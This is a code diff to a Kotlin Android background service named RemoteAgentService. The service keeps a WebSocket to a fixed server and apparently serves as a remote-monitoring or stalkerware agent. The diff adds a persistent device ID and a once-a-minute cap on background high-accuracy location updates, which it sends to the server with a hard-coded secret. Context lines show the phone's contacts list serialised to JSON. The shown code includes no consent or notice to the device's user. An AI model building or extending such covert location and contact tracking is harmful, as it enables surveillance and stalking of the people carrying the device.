@@ -66,7 +66,7 @@ class RemoteAgentService : Service() {
     private lateinit var wakeLock: PowerManager.WakeLock
 
     private var wsClient: WebSocketClient? = null
-    private val deviceId = "android-device-001" // give a unique ID per device
+    private val deviceId by lazy { getOrCreateDeviceId() }
     private val DEVICE_SECRET = "very-strong-device-secret"
 
     companion object {
@@ -76,7 +76,6 @@ class RemoteAgentService : Service() {
         const val WS_URL = "ws://$SERVER_IP:$SERVER_PORT/ws"
         const val HTTP_BASE = "http://$SERVER_IP:$SERVER_PORT"
     }
-
 
     override fun onCreate() {
         super.onCreate()
@@ -231,6 +230,18 @@ class RemoteAgentService : Service() {
         }
     }
 
+    private fun getOrCreateDeviceId(): String {
+        val prefs = getSharedPreferences("remote_agent_prefs", MODE_PRIVATE)
+
+        var id = prefs.getString("device_id", null)
+        if (id == null) {
+            id = java.util.UUID.randomUUID().toString()
+            prefs.edit().putString("device_id", id).apply()
+        }
+        return id
+    }
+
+
 
 
 
@@ -303,13 +314,65 @@ class RemoteAgentService : Service() {
         return Gson().toJson(contactsList)
     }
 
+//    private fun startLocationUpdates() {
+//        val client = LocationServices.getFusedLocationProviderClient(this)
+//
+//        val request = LocationRequest.Builder(
+//            Priority.PRIORITY_HIGH_ACCURACY,
+//            2000 // 2 seconds
+//        ).setMinUpdateDistanceMeters(1f)
+//            .setWaitForAccurateLocation(true)
+//            .build()
+//
+//        val callback = object : LocationCallback() {
+//            override fun onLocationResult(result: LocationResult) {
+//                try {
+//                    val loc = result.lastLocation ?: return
+//
+//                    val json = """
+//            {
+//              "type": "location",
+//              "deviceId": "$deviceId",
+//              "lat": ${loc.latitude},
+//              "lng": ${loc.longitude},
+//              "accuracy": ${loc.accuracy},
+//              "auth": "$DEVICE_SECRET"
+//            }
+//        """.trimIndent()
+//
+//                    if (wsClient != null && wsClient!!.isOpen) {
+//                        wsClient!!.send(json)
+//                    } else {
+//                        println("⚠️ WebSocket not connected — skipping location send")
+//                    }
+//
+//                    println("📍 Background Location: $json")
+//                } catch (e: Exception) {
+//                    println("❌ LOCATION CALLBACK CRASH PREVENTED: ${e.message}")
+//                }
+//            }
+//
+//        }
+//
+//        if (ActivityCompat.checkSelfPermission(
+//                this,
+//                Manifest.permission.ACCESS_FINE_LOCATION
+//            ) != PackageManager.PERMISSION_GRANTED
+//        ) return
+//
+//        client.requestLocationUpdates(request, callback, Looper.getMainLooper())
+//    }
+
+    private var lastLocationSentTime = 0L
+
     private fun startLocationUpdates() {
         val client = LocationServices.getFusedLocationProviderClient(this)
 
         val request = LocationRequest.Builder(
             Priority.PRIORITY_HIGH_ACCURACY,
-            2000 // 2 seconds
-        ).setMinUpdateDistanceMeters(1f)
+            2000 // internal update interval (2 sec)
+        )
+            .setMinUpdateDistanceMeters(1f)
             .setWaitForAccurateLocation(true)
             .build()
 
@@ -318,15 +381,21 @@ class RemoteAgentService : Service() {
                 try {
                     val loc = result.lastLocation ?: return
 
+                    // 🔥 send only once every 60 seconds
+                    val now = System.currentTimeMillis()
+                    if (now - lastLocationSentTime < 60_000) return
+                    lastLocationSentTime = now
+
                     val json = """
-            {
-              "type": "location",
-              "deviceId": "$deviceId",
-              "lat": ${loc.latitude},
-              "lng": ${loc.longitude},
-              "accuracy": ${loc.accuracy}
-            }
-        """.trimIndent()
+                {
+                  "type": "location",
+                  "deviceId": "$deviceId",
+                  "lat": ${loc.latitude},
+                  "lng": ${loc.longitude},
+                  "accuracy": ${loc.accuracy},
+                  "auth": "$DEVICE_SECRET"
+                }
+                """.trimIndent()
 
                     if (wsClient != null && wsClient!!.isOpen) {
                         wsClient!!.send(json)
@@ -334,12 +403,11 @@ class RemoteAgentService : Service() {
                         println("⚠️ WebSocket not connected — skipping location send")
                     }
 
-                    println("📍 Background Location: $json")
+                    println("📍 Background Location Sent (every 60s)")
                 } catch (e: Exception) {
                     println("❌ LOCATION CALLBACK CRASH PREVENTED: ${e.message}")
                 }
             }
-
         }
 
         if (ActivityCompat.checkSelfPermission(
@@ -350,6 +418,7 @@ class RemoteAgentService : Service() {
 
         client.requestLocationUpdates(request, callback, Looper.getMainLooper())
     }
+
 
 
     private fun handleLocation() {
